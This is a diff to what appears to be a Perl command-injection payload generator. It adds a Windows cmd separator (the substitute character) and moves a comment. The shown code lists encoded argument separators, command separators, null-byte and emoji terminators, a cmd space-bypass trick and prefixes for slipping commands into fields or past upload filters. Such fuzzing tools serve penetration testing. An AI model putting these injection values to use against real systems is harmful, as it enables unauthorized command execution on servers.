@@ -51,6 +51,7 @@ $PAYL,
 my @ARGUMENT_SEPARATORS=('%20%20',"%09%09"); 
 my @COMMAND_SEPARATORS=('%0a%0a','%0d%0d','%26','|'); #  <<D%0aD%0a is nice, but redundant, as it requires %0a
 my @COMMAND_TERMINATORS=("%00",'💩','%20%20#');# the first two make sense only if the command is saved into a file (script) or a database entry before being executed (in order to get rid of the hardcoded command shite if separators fail to get rid of its impact, or if dealing with some quoted injection
+# %F0%9F%92%A9 encoded poo
 
 if($TARGET_OS eq 'nix'||$TARGET_OS eq 'all')
 {
@@ -60,9 +61,8 @@ if($TARGET_OS eq 'nix'||$TARGET_OS eq 'all')
 if($TARGET_OS eq 'win'||$TARGET_OS eq 'all')
 {
 	push(@ARGUMENT_SEPARATORS,'%ProgramFiles:~10,1%'); # a cmd-specific hacky way to use space without a space, too bad it uses other dodgy characters :)
+	push(@COMMAND_SEPARATORS,chr(26)); # as I found out, so called substitute character works as cmd separator for echo in cmd :D	
 }
-
-# %F0%9F%92%A9 encoded poo
 
 # invvvvv212.org','1', example.org for command injection into overlays of tools like whois. On the flip side, for file uploads these could be '.PNG', '.TXT','.DOC'optional list of suffixes to try (e.g. in order to bypass filters), used only with terminators
 my @PREFIXES=('foo.co.uk'); # this could be profiled as well (e.g. profiles like 'hostname','uname','all')
